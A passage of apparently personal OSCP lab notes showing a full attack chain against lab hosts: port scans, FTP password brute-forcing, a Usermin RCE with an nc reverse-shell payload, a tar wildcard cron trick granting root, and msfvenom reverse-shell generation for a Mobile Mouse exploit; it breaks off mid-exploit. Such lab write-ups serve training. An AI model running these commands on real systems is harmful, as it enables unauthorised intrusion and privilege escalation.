|      Connected to ::ffff:192.168.45.161
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d4:42:73:1a:5d:56:fb:03:9b:52:0a:e2:f4:db:9b:73 (ECDSA)
|_  256 ca:60:a1:9e:9c:bb:e0:24:1c:43:41:34:a1:a2:10:08 (ED25519)
80/tcp    open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
20000/tcp open  http    MiniServ 1.820 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=utf-8).
|_http-server-header: MiniServ/1.820
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.60 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-03 16:41 HKT
Nmap scan report for 192.168.242.157
Host is up (0.041s latency).
Not shown: 95 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
135/udp   closed msrpc
1022/udp  closed exp2
3456/udp  closed IISrpc-or-vat
5000/udp  closed upnp
49185/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 6.92 seconds

```

### FTP

{{< toggle "Tag 🏷️" >}}

{{< tag "Port21-FTP-Burteforce" >}} With the ftp-betterdefaultpasslist.txt to brute-force the FTP target

{{< /toggle >}}

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $hydra -C ./ftp-betterdefaultpasslist.txt  ftp://192.168.242.157 -f -V 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-03 16:56:37
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking ftp://192.168.242.157:21/
[ATTEMPT] target 192.168.242.157 - login "anonymous" - pass "anonymous" - 1 of 66 [child 0] (0/0)
[ATTEMPT] target 192.168.242.157 - login "root" - pass "rootpasswd" - 2 of 66 [child 1] (0/0)
[ATTEMPT] target 192.168.242.157 - login "root" - pass "12hrs37" - 3 of 66 [child 2] (0/0)
[ATTEMPT] target 192.168.242.157 - login "ftp" - pass "b1uRR3" - 4 of 66 [child 3] (0/0)
[ATTEMPT] target 192.168.242.157 - login "admin" - pass "admin" - 5 of 66 [child 4] (0/0)
[ATTEMPT] target 192.168.242.157 - login "localadmin" - pass "localadmin" - 6 of 66 [child 5] (0/0)
[ATTEMPT] target 192.168.242.157 - login "admin" - pass "1234" - 7 of 66 [child 6] (0/0)
[ATTEMPT] target 192.168.242.157 - login "apc" - pass "apc" - 8 of 66 [child 7] (0/0)
[ATTEMPT] target 192.168.242.157 - login "admin" - pass "nas" - 9 of 66 [child 8] (0/0)
[ATTEMPT] target 192.168.242.157 - login "Root" - pass "wago" - 10 of 66 [child 9] (0/0)
[ATTEMPT] target 192.168.242.157 - login "Admin" - pass "wago" - 11 of 66 [child 10] (0/0)
[ATTEMPT] target 192.168.242.157 - login "User" - pass "user" - 12 of 66 [child 11] (0/0)
[ATTEMPT] target 192.168.242.157 - login "Guest" - pass "guest" - 13 of 66 [child 12] (0/0)
[ATTEMPT] target 192.168.242.157 - login "ftp" - pass "ftp" - 14 of 66 [child 13] (0/0)
[ATTEMPT] target 192.168.242.157 - login "admin" - pass "password" - 15 of 66 [child 14] (0/0)
[ATTEMPT] target 192.168.242.157 - login "a" - pass "avery" - 16 of 66 [child 15] (0/0)
[21][ftp] host: 192.168.242.157   login: anonymous   password: anonymous
[STATUS] attack finished for 192.168.242.157 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-03 16:56:38

```

```
ftp> mget *
local: BROCHURE-TEMPLATE.pdf remote: BROCHURE-TEMPLATE.pdf
229 Entering Extended Passive Mode (|||10093|)
150 Opening BINARY mode data connection for BROCHURE-TEMPLATE.pdf (145831 bytes).
100% |**************************************************************************************************************************|   142 KiB  801.96 KiB/s    00:00 ETA
226 Transfer complete.
145831 bytes received in 00:00 (645.74 KiB/s)
local: CALENDAR-TEMPLATE.pdf remote: CALENDAR-TEMPLATE.pdf
229 Entering Extended Passive Mode (|||10094|)
150 Opening BINARY mode data connection for CALENDAR-TEMPLATE.pdf (159765 bytes).
100% |**************************************************************************************************************************|   156 KiB    1.07 MiB/s    00:00 ETA
226 Transfer complete.
159765 bytes received in 00:00 (848.52 KiB/s)
local: FUNCTION-TEMPLATE.pdf remote: FUNCTION-TEMPLATE.pdf
229 Entering Extended Passive Mode (|||10090|)
150 Opening BINARY mode data connection for FUNCTION-TEMPLATE.pdf (336971 bytes).
100% |**************************************************************************************************************************|   329 KiB    1.79 MiB/s    00:00 ETA
226 Transfer complete.
336971 bytes received in 00:00 (1.38 MiB/s)
local: NEWSLETTER-TEMPLATE.pdf remote: NEWSLETTER-TEMPLATE.pdf
229 Entering Extended Passive Mode (|||10095|)
150 Opening BINARY mode data connection for NEWSLETTER-TEMPLATE.pdf (739052 bytes).
100% |**************************************************************************************************************************|   721 KiB    2.04 MiB/s    00:00 ETA
226 Transfer complete.
739052 bytes received in 00:00 (1.82 MiB/s)
local: REPORT-TEMPLATE.pdf remote: REPORT-TEMPLATE.pdf
229 Entering Extended Passive Mode (|||10097|)
150 Opening BINARY mode data connection for REPORT-TEMPLATE.pdf (888653 bytes).
100% |**************************************************************************************************************************|   867 KiB    2.16 MiB/s    00:00 ETA
226 Transfer complete.
888653 bytes received in 00:00 (1.95 MiB/s)

```

### web 80

![Pasted image 20260703164447.png](/ob/Pasted%20image%2020260703164447.png)

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $exiftool *.pdf | grep Author
bash: exiftool: command not found
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $sudo apt install exiftool 
[sudo] password for tester: 
Note, selecting 'libimage-exiftool-perl' instead of 'exiftool'
The following packages were automatically installed and are no longer required:
  gparted  gparted-common  kpartx  libparted-fs-resize0t64  openjdk-17-jdk  openjdk-17-jdk-headless
Use 'sudo apt autoremove' to remove them.
```

```
 ┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $exiftool *.pdf | grep Author
Author                          : Cassie
Author                          : Mark
Author                          : Robert

```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $cat user
Cassie
cassie
mark
Mark
Robert
robert

```

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $hydra -L ./user -P ./user ftp://192.168.180.156 -f -V
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-03 17:11:25
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries (l:6/p:6), ~3 tries per task
[DATA] attacking ftp://192.168.180.156:21/
[ATTEMPT] target 192.168.180.156 - login "Cassie" - pass "Cassie" - 1 of 36 [child 0] (0/0)
[ATTEMPT] target 192.168.180.156 - login "Cassie" - pass "cassie" - 2 of 36 [child 1] (0/0)
[ATTEMPT] target 192.168.180.156 - login "Cassie" - pass "mark" - 3 of 36 [child 2] (0/0)

```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $ftp 192.168.242.157
Connected to 192.168.242.157.
220 (vsFTPd 3.0.5)
Name (192.168.242.157:tester): cassie
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $ftp 192.168.242.157
Connected to 192.168.242.157.
220 (vsFTPd 3.0.5)
Name (192.168.242.157:tester): cassie
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10092|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000           33 Jul 03 08:31 
```

I  can go everywhere

```
229 Entering Extended Passive Mode (|||10090|)
150 Here comes the directory listing.
lrwxrwxrwx    1 0        0               7 Apr 21  2022 bin -> usr/bin
drwxr-xr-x    4 0        0            4096 Nov 02  2022 boot
drwxr-xr-x   21 0        0            4080 Jul 03 08:28 dev
drwxr-xr-x   99 0        0            4096 Jul 03 08:48 etc
drwxr-xr-x    5 0        0            4096 Jul 03 08:28 home
lrwxrwxrwx    1 0        0               7 Apr 21  2022 lib -> usr/lib
lrwxrwxrwx    1 0        0               9 Apr 21  2022 lib32 -> usr/lib32
lrwxrwxrwx    1 0        0               9 Apr 21  2022 lib64 -> usr/lib64
lrwxrwxrwx    1 0        0              10 Apr 21  2022 libx32 -> usr/libx32
drwx------    2 0        0           16384 Oct 31  2022 lost+found
drwxr-xr-x    2 0        0            4096 Apr 21  2022 media
drwxr-xr-x    2 0        0            4096 Apr 21  2022 mnt
drwxr-xr-x    3 0        0            4096 Nov 02  2022 opt
dr-xr-xr-x  153 0        0               0 Jul 03 08:28 proc
drwx------    7 0        0            4096 Apr 04  2023 root
drwxr-xr-x   30 0        0             880 Jul 03 08:45 run
lrwxrwxrwx    1 0        0               8 Apr 21  2022 sbin -> usr/sbin
drwxr-xr-x    6 0        0            4096 Apr 21  2022 snap
drwxr-xr-x    3 0        0            4096 Nov 02  2022 srv
-rw-------    1 0        0        4115660800 Oct 31  2022 swap.img
dr-xr-xr-x   13 0        0               0 Jul 03 08:28 sys
drwxrwxrwt   14 0        0            4096 Jul 03 08:48 tmp
-rw-r--r--    1 0        0            2052 Nov 02  2022 usermin-setup.out
drwxr-xr-x   14 0        0            4096 Apr 21  2022 usr
drwxr-xr-x   15 0        0            4096 Nov 02  2022 var

```

```

┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $cat usermin-setup.out

─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $cat usermin-setup.out
***********************************************************************
*            Welcome to the Usermin setup script, version 1.820       *
***********************************************************************
Usermin is a web-based interface that allows Unix-like operating
systems and common Unix services to be easily administered.

Installing Usermin in /usr/share/usermin ...

***********************************************************************
Usermin uses separate directories for configuration files and log files.
Unless you want to run multiple versions of Usermin at the same time
you can just accept the defaults.

Config file directory [/etc/usermin]: Log file directory [/var/usermin]: 
***********************************************************************
Usermin is written entirely in Perl. Please enter the full path to the
Perl 5 interpreter on your system.


Testing Perl ...
Perl seems to be installed ok

***********************************************************************
Operating system name:    Ubuntu Linux
Operating system version: 22.04.1

***********************************************************************
Usermin uses its own password protected web server to provide access
to the administration programs. The setup script needs to know :
 - What port to run the web server on. There must not be another
   web server already using this port.
 - If the webserver should use SSL (if your system supports it).

Web server port (default 20000): ***********************************************************************
Creating web server config files..
./setup.sh: 415: [: 1: unexpected operator
..done

Creating access control file..
..done

Creating start and stop scripts..
..done

Copying config files..
at changepass chfn commands cron cshrc fetchmail file filemin filter forward gnupg htaccess-htpasswd htaccess language mailbox mailcap man mysql plan postgresql proc procmail quota schedule shell spam ssh telnet theme tunnel updown usermount
..done

Changing ownership and permissions ..
..done


```

{{< toggle "Tag 🏷️" >}}

{{< tag "CMS-Usermin-RCE" >}} With the auth user to do the 50234 RCE

{{< /toggle >}}

![Pasted image 20260703164447.png](/ob/Pasted%20image%2020260703164447.png)

![Pasted image 20260703172825.png](/ob/Pasted%20image%2020260703172825.png)

Found the version in the FTF share

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $cat version 
1.820

```

Download form exploitDB

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $wget https://www.exploit-db.com/download/50234
--2026-07-03 17:32:27--  https://www.exploit-db.com/download/50234
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3533 (3.5K) [application/txt]
Saving to: ‘50234’

```

exploit command

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $python 50234.py -u 192.168.242.157 -l cassie -p cassie
/home/tester/Desktop/offsec/oscpC/50234.py:82: SyntaxWarning: invalid escape sequence '\?'
  last_gets_key = re.findall("edit_key.cgi\?(.*?)'",str(key_list.content))[-2]
[+] Target https://192.168.242.157:20000
[+] Login successfully
[+] Setup GnuPG
[+] Payload {'name': '";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.0.0.0 1337 >/tmp/f;echo "', 'email': '1337@webmin.com'}
[+] Setup successful
[+] Fetching key list
[+] Key : idx=0\
[+] 5ucc355fully_3xpl017

```

Receive the RCE

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC/userminrce]
└──╼ $nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 192.168.242.157 47044
sh: cannot set terminal process group (999): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.1$ whoami 
whoami 
cassie
sh-5.1$ 

```

### linux-smart-enumeration

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Privilege-Escalation-Linux-smart-enumeration" >}} quick find the exploit with  linux-smart-enumeration ( lse.sh ) in step by step

{{< /toggle >}}

Download the lse.sh

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh
```

enable the upload server

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $python -m uploadserver
```

Download back form parrt os

```
cassie@lab-pwk2-student-cl6-157-ubuntu2204-charlie-245-192:/tmp$ curl http://192.168.5.4:8000/  -O lse.sh
```

Execute it

```
cassie@lab-pwk2-student-cl6-157-ubuntu2204-charlie-245-192:/tmp$ chmod +x lse.sh 
cassie@lab-pwk2-student-cl6-157-ubuntu2204-charlie-245-192:/tmp$ ./lse.sh 
---
If you know the current user password, write it here to check sudo privileges: cassie
---

 LSE Version: 4.14nw

        User: cassie
     User ID: 1000
    Password: ******
        Home: /home/cassie
        Path: /bin:/usr/bin:/sbin:/usr/sbin:/usr/local/bin:/bin:/usr/bin:/sbin:/usr/sbin:/usr/local/bin:/sbin:/usr/sbin:/bin:/usr/bin
       umask: 0022

    Hostname: lab-pwk2-student-cl6-157-ubuntu2204-charlie-245-192
       Linux: 5.15.0-52-generic
Distribution: Ubuntu 22.04.1 LTS
Architecture: x86_64

=====================( Current Output Verbosity Level: 0 )======================
===============================================================( humanity )=====
[!] nowar0 Should we question autocrats and their "military operations"?... yes!
---
                                      NO   
                                      WAR  
---
==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... yes!
[*] usr020 Are there other users in administrative groups?................. yes!
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip
[i] usr060 Other users..................................................... skip
[*] usr070 PATH variables defined inside /etc.............................. yes!
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[!] sud020 Can we sudo with a password?.................................... nope
[!] sud030 Can we list sudo commands with a password?...................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ yes!
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/snap/snapd/17576/usr/lib/snapd/snap-confine
/snap/snapd/17336/usr/lib/snapd/snap-confine
---
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip
[!] fst060 Can we write to any setgid binary?.............................. skip
[*] fst070 Can we read /root?.............................................. nope
[*] fst080 Can we read subdirectories under /home?......................... nope
[*] fst090 SSH files in home directories................................... yes!
[*] fst100 Useful binaries................................................. yes!
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'cassie' have mail?........................................ nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. nope
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... nope
[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
[i] fst500 Files owned by user 'cassie'.................................... skip
[i] fst510 SSH files anywhere.............................................. skip
[i] fst520 Check hosts.equiv file and its contents......................... skip
[i] fst530 List NFS server shares.......................................... skip
[i] fst540 Dump fstab file................................................. skip
=================================================================( system )=====
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip
[!] sys020 Does the /etc/passwd have hashes?............................... nope
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read shadow files?....................................... nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... yes!
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip
[i] sys080 System password policies in /etc/login.defs..................... skip
===============================================================( security )=====
[*] sec000 Is SELinux present?............................................. nope
[*] sec010 List files with capabilities.................................... yes!
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
[!] sec060 Can we read the auditd log?..................................... nope
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. yes!
[!] ret060 Can we write to executable paths present in cron jobs........... yes!
---
/etc/cron.d/2minutes:*/2 * * * * root cd /opt/admin && tar -zxf /tmp/backup.tar.gz *
---
[i] ret400 Cron files...................................................... skip
[*] ret500 User systemd timers............................................. nope
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====
[*] net000 Services listening only on localhost............................ nope
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip
[i] net520 ARP table....................................................... skip
[i] net530 Nameservers..................................................... skip
[i] net540 Systemd Nameservers............................................. skip
[i] net550 Listening TCP................................................... skip
[i] net560 Listening UDP................................................... skip
===============================================================( services )=====
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip
[i] srv420 List /etc/xinetd.d if used...................................... skip
[i] srv430 List /etc/init.d/ permissions................................... skip
[i] srv440 List /etc/rc.d/init.d permissions............................... skip
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip
[i] srv460 List /etc/init/ permissions..................................... skip
[!] srv500 Can we write in systemd service files?.......................... nope
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ yes!
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. nope
[!] sof090 Found any keepass database files?............................... nope
[!] sof100 Found any 'pass' store directories?............................. nope
[!] sof110 Are there any tmux sessions available?.......................... nope
[*] sof120 Are there any tmux sessions from other users?................... nope
[!] sof130 Can we write to tmux session sockets from other users?.......... nope
[!] sof140 Are any screen sessions available?.............................. nope
[*] sof150 Are there any screen sessions from other users?................. nope
[!] sof160 Can we write to screen session sockets from other users?........ nope
[*] sof170 Can we access MongoDB databases without credentials?............ nope
[!] sof180 Can we access any Kerberos credentials?......................... nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip
[i] sof520 Postgres version................................................ skip
[i] sof530 Apache version.................................................. skip
[i] sof540 Tmux version.................................................... skip
[i] sof550 Screen version.................................................. skip
=============================================================( containers )=====
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
[*] pro030 Processes running by non-root users with shell.................. yes!
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip
===================================================================( CVEs )=====
[!] cve-2019-5736 Escalate in some types of docker containers.............. nope
[!] cve-2021-3156 Sudo Baron Samedit vulnerability......................... nope
[!] cve-2021-3560 Checking for policykit vulnerability..................... nope
[!] cve-2021-4034 Checking for PwnKit vulnerability........................ nope
[!] cve-2022-0847 Dirty Pipe vulnerability................................. nope
[!] cve-2022-25636 Netfilter linux kernel vulnerability.................... nope
[!] cve-2023-22809 Sudoedit bypass in Sudo <= 1.9.12p1..................... yes!
---
Vulnerable! sudo version: 1.9.9-1ubuntu2.1
---

```

tar 's exploit

```
cassie@lab-pwk2-student-cl6-157-ubuntu2204-charlie-245-192:/tmp$ cd /opt/admin
cassie@lab-pwk2-student-cl6-157-ubuntu2204-charlie-245-192:/opt/admin$ echo 'chmod +s /bin/bash' > shell.sh
cassie@lab-pwk2-student-cl6-157-ubuntu2204-charlie-245-192:/opt/admin$ chmod +x shell.sh
cassie@lab-pwk2-student-cl6-157-ubuntu2204-charlie-245-192:/opt/admin$ touch -- '--checkpoint=1'
cassie@lab-pwk2-student-cl6-157-ubuntu2204-charlie-245-192:/opt/admin$ touch -- '--checkpoint-action=exec=sh shell.sh'
cassie@lab-pwk2-student-cl6-157-ubuntu2204-charlie-245-192:/opt/admin$ /bin/bash -p
bash-5.1# whomai 
bash: whomai: command not found
bash-5.1# whoami
root

```

# Recon IP 6

### \[\[PORT & IP SCAN]]

```
PORT      STATE SERVICE  VERSION
80/tcp    open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
5986/tcp  open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2026-07-03T22:45:50+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=Cloudbase-Init WinRM
| Not valid before: 2026-07-02T16:29:49
|_Not valid after:  2036-06-30T16:29:49
9099/tcp  open  unknown
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 200 OK 
|     Server: Mobile Mouse Server 
|     Content-Type: text/html 
|     Content-Length: 321
|_    <HTML><HEAD><TITLE>Success!</TITLE><meta name="viewport" content="width=device-width,user-scalable=no" /></HEAD><BODY BGCOLOR=#000000><br><br><p style="font:12pt arial,geneva,sans-serif; text-align:center; color:green; font-weight:bold;" >The server running on "OSCP" was able to receive your request.</p></BODY></HTML>
9999/tcp  open  abyss?
35913/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9099-TCP:V=7.95%I=7%D=7/3%Time=6A47CA68%P=x86_64-pc-linux-gnu%r(Get
SF:Request,1A2,"HTTP/1\.0\x20200\x20OK\x20\r\nServer:\x20Mobile\x20Mouse\x
SF:20Server\x20\r\nContent-Type:\x20text/html\x20\r\nContent-Length:\x2032
SF:1\r\n\r\n<HTML><HEAD><TITLE>Success!</TITLE><meta\x20name=\"viewport\"\
SF:x20content=\"width=device-width,user-scalable=no\"\x20/></HEAD><BODY\x2
SF:0BGCOLOR=#000000><br><br><p\x20style=\"font:12pt\x20arial,geneva,sans-s
SF:erif;\x20text-align:center;\x20color:green;\x20font-weight:bold;\"\x20>
SF:The\x20server\x20running\x20on\x20\"OSCP\"\x20was\x20able\x20to\x20rece
SF:ive\x20your\x20request\.</p></BODY></HTML>\r\n")%r(FourOhFourRequest,1A
SF:2,"HTTP/1\.0\x20200\x20OK\x20\r\nServer:\x20Mobile\x20Mouse\x20Server\x
SF:20\r\nContent-Type:\x20text/html\x20\r\nContent-Length:\x20321\r\n\r\n<
SF:HTML><HEAD><TITLE>Success!</TITLE><meta\x20name=\"viewport\"\x20content
SF:=\"width=device-width,user-scalable=no\"\x20/></HEAD><BODY\x20BGCOLOR=#
SF:000000><br><br><p\x20style=\"font:12pt\x20arial,geneva,sans-serif;\x20t
SF:ext-align:center;\x20color:green;\x20font-weight:bold;\"\x20>The\x20ser
SF:ver\x20running\x20on\x20\"OSCP\"\x20was\x20able\x20to\x20receive\x20you
SF:r\x20request\.</p></BODY></HTML>\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 219.32 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-03 22:45 HKT
Nmap scan report for 192.168.242.155
Host is up (0.052s latency).
All 100 scanned ports on 192.168.242.155 are in ignored states.
Not shown: 100 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 7.26 seconds

```

### TCP 9099

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $wget https://www.exploit-db.com/download/51010 
--2026-07-03 22:53:22--  https://www.exploit-db.com/download/51010
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1866 (1.8K) [application/txt]
Saving to: ‘51010’

51010                  100%[===========================>]   1.82K  --.-KB/s    in 0s  
```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpC/mobile-mouse-rce]
└──╼ $msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.161  LPORT=9099 -f exe -o met.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: met.exe

```

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.161  LPORT=9099 -f exe -o met.exe   
python -m http.server 8080[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: met.exe
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $python 51010.py --target 192.168.242.155  --file met.exe --lhost 192.168.45.161
  File "/home/tester/Desktop/offsec/oscpC/51010.py", line 41
    download_string= f"curl http://{lhost}:8080/{command_shell} -o
                     ^
SyntaxError: unterminated f-string literal (detected at line 41)
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $python3 51010.py --target 192.168.242.155  --file met.exe --lhost 192.168.45.161
  File "/home/tester/Desktop/offsec/oscpC/51010.py", line 41
    download_string= f"curl http://{lhost}:8080/{command_shell} -o
                     ^
SyntaxError: unterminated f-string literal (detected at line 41)
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $subl 51010.py 
┌─[tester@parrot]─[~/Desktop/offsec/oscpC]
└──╼ $python3 51010.py --target 192.168.242.155  --file met.exe --lhost 192.168.45.161
/home/tester/Desktop/offsec/oscpC/51010.py:41: SyntaxWarning: invalid escape sequence '\{'
